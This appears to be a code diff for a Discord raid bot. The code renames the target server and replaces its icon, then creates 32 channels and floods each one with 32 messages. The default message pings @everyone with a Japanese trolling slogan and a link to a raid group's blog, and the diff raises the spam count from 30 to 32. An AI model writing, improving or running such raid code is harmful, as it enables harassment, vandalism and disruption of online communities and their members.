@@ -70,9 +70,11 @@ https://discord.gg/annycW3Xrk
         }
       });
 
-      const max = 30;
+      const max = 32;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
-      discordServer?.setIcon("https://ctkpaarrdata.files.wordpress.com/2023/03/cropped-20211120_125906.gif?w=196")
+      discordServer?.setIcon(
+        "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
+      );
 
       for (let i = 0; i < max; i++) {
         discordServer?.channels
@@ -82,15 +84,13 @@ https://discord.gg/annycW3Xrk
           })
           .then(async (channel) => {
             for (let j = 0; j < max; j++) {
-                await channel.send(
-                  text ??
-                    "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
-                );
+              await channel.send(
+                text ??
+                  "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
+              );
             }
           });
       }
-
-      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
     }
   }
 });
